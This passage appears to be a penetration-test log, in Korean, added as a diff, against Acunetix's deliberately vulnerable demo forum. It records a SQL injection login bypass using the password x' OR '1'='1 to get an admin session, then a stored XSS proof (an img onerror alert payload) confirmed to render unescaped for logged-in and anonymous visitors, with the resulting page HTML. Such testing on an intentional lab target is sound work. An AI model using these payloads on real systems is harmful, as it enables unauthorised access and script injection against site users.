@@ -1,0 +1,41 @@
+### 1. 따옴표 없는 우회 로그인: tfUName=admin / tfUPass=x' OR '1'='1
+login code=302 redirect=http://testasp.vulnweb.com/Default.asp
+HTTP/1.1 302 Object moved
+Location: Default.asp
+세션 사용자명: logout admin
+
+### 2. BEFORE
+code=200 size=4099
+posttext=1 RT6마커=0
+
+### 3. POST — 승인된 게시글 1건 (영향 최소: 스레드 id=0 고정, id 주입 없음)
+code=200 size=4417
+HTTP/1.1 200 OK
+
+### 4. AFTER — 인증 세션 / 미인증 양쪽에서 확인
+auth code=200 size=4417
+anon code=200 size=3349
+r6b_after_auth   posttext=1 RT6마커=1 원문페이로드=1 HTML이스케이프=0
+r6b_after_anon   posttext=1 RT6마커=1 원문페이로드=1 HTML이스케이프=0
+
+### 5. 저장된 글 원문 문맥
+n/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+		<div class="path">
+			<a href="showforum.asp?id=0">Acunetix Web Vulnerability Scanner</a>/1
+		</div>
+      <table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5">
+        <tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/noavatar.gif'><br>posted by <b>admin</b> on 11/9/2005 12:16:25 PM</td><td valign='top' bgcolor='#FFFFFF'><div class='posttitle'>1</div><div class='posttext'>1</div></td></tr><tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/noavatar.gif'><br>posted by <b>admin</b> on 9/23/2026 8:34:07 AM</td><td valign='top' bgcolor='#FFFFFF'><div class='posttitle'>RT6-STORED-XSS-PROOF - 49.142.61.26</div><div class='posttext'><img src=x onerror=alert(1)></div></td></tr>
+      </table>
+      
+      <!-- InstanceEndEditable --></td> 
+  </tr> 
+  <tr align="right" bgcolor="#FFFFFF"> 
+    <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> 
+  </tr> 
+</table> 
+<div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px">
+	<p style="padding-left:20%;padding-right:20%"><b>Warning</b>: This forum is delibe
